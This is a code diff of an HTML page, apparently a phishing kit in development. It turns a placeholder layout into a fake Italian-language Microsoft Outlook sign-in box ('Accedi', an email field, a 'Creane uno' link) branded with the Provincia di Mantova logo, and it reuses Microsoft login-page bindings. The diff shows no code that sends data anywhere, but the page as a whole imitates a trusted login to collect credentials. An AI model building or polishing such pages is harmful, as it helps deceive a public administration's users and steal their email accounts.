@@ -10,43 +10,105 @@
     <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
     <!-- CSS -->
     <style>
-        .center-div {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: white; /* White background */
-            width: 65%; /* Adjust width */
-            max-width: 440px; /* Maximum width */
-            height: 350px;
-            padding: 20px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Optional shadow */
-            border-radius: 8px; /* Optional rounded corners */
-            display: flex;
-            flex-direction: column; /* Arrange sub-divs vertically */
-            gap: 10px; /* Space between sub-divs */
-        }
-
-
-.logo {
-    width: 30px; /* Adjust size as needed */
-    height: auto;
-    margin-right: 5px; /* Space between the logo and text */
+.center-div {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background-color: white; /* White background */
+  width: 65%; /* Adjust width */
+  max-width: 440px; /* Maximum width */
+  height: 380px;
+  padding: 40px;
+  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Optional shadow */
+  display: flex;
+  flex-direction: column; /* Arrange sub-divs vertically */
+  gap: 10px; /* Space between sub-divs */
 }
-        .sub-div {
-            padding: 10px;
-            display: flex;
-            justify-content: center; /* Center content horizontally */
-            align-items: center; /* Center content vertically */
-        }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+.bd {
+  max-width: 352px; /* Maximum width */
+  margin-top: 9px;
+  height: 240px;
+  display: flex;
+  flex-direction: column; /* Stack child elements vertically */
+}
 
-        /* Basic Typography */
+.container {
+  display: flex;
+  justify-content: flex-end; /* Align content to the right */
+  width: 100%;
+  margin-top: auto; /* Push the container to the bottom of the .bd div */
+}
+
+.blue-button {
+  background-color: #0864bc; /* Lighter blue */
+  color: white; /* White text */
+  border: none; /* Remove the border */
+  padding: 10px 20px; /* Add padding */
+  font-size: 16px; /* Font size */
+  cursor: pointer; /* Change cursor to pointer */
+  border-radius: 5px; /* Optional: rounded corners */
+}
+
+.blue-button:hover {
+  background-color: #0864bc; /* Darker blue on hover */
+}
+
+.sub-div1 {
+  max-width: 352px; /* Maximum width */
+  height: 36px;
+  display: flex;
+  justify-content: flex-start; /* Align content to the left */
+  align-items: center; /* Center content vertically */
+}
+.sub-div2 {
+  max-width: 352px; /* Maximum width */
+  height: 36px;
+  display: flex;
+  justify-content: flex-start; /* Align content to the left */
+  align-items: center; /* Center content vertically */
+  
+}
+.sub-div21 {
+  max-width: 352px; /* Maximum width */
+  height: 20px;
+  display: flex;
+  justify-content: flex-start; /* Align content to the left */
+  align-items: center; /* Center content vertically */
+  margin-bottom: 16px;
+  
+}
+.sub-div3 {
+  max-width: 352px; /* Maximum width */
+  height: 36px;
+  display: flex;
+  justify-content: flex-start; /* Align content to the left */
+  align-items: center; /* Center content vertically */
+}
+
+.sub-div3 input {
+  border: none; /* Remove the default border */
+  outline: none; /* Remove the outline when the input is focused */
+  background: transparent; /* Make background transparent */
+  width: 100%; /* Make the input take full width of the container */
+  height: 100%; /* Make the input take full height of the container */
+  font-size: 16px; /* Adjust font size as needed */
+    border-bottom: 1px solid #0864bc; /* Add a blue line beneath the input */
+}
+.sub-div4 {
+  max-width: 352px; /* Maximum width */
+  height: 36px;
+  display: flex;
+  justify-content: flex-start; /* Align content to the left */
+  align-items: center; /* Center content vertically */
+}
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
         body {
             background-image: url('back.png');
             background-size: cover;
@@ -58,11 +120,6 @@
             align-items: center;
             padding: 0;
             margin: 0;
-        }
-
-        /* You can also add styles for the lightbox if needed */
-        .lightbox-cover {
-            display: none; /* Or make it visible based on your condition */
         }
     </style>
     <!-- <link rel="stylesheet" href="css/styles.css"> -->
@@ -78,16 +135,32 @@
         <!-- Central White Div -->
         <div class="center-div">
             <!-- Sub Divs (7 total) -->
-<div class="sub-div">
-    <img src="logo_provincia_piccolo.gif" alt="Provincia di Mantova Logo" class="logo">
-    Provincia di Mantova
+<div class="sub-div1">
+    <img src="bannerlogo" alt="Provincia di Mantova Logo" class="logo">
 </div>
 
-            <div class="sub-div">Sub Div 2</div>
-            <div class="sub-div">Sub Div 3</div>
-            <div class="sub-div">Sub Div 4</div>
-            <div class="sub-div">Sub Div 5</div>
-            <div class="sub-div">Sub Div 6</div>
+
+<div class="bd">
+
+            <div class="sub-div2">
+			    <h2>Accedi</h2>
+			</div>
+
+	            <div class="sub-div21">
+				<small>Passare a Outlook</small>
+			</div>						
+            <div class="sub-div3">
+			<input type="text" class="sub-div" placeholder="Indirizzo di posta elettronica">
+			</div>
+            <div class="sub-div4">
+			<small>Nessun account?&nbsp;</small> <a href="https://www.outlook.com" target="_blank"><small>Creane uno</small></a>
+			</div>
+
+            <div class="container">
+			  <button class="blue-button">Accedi</button>
+			</div>
+</div>
+
         </div>
     </main>
 
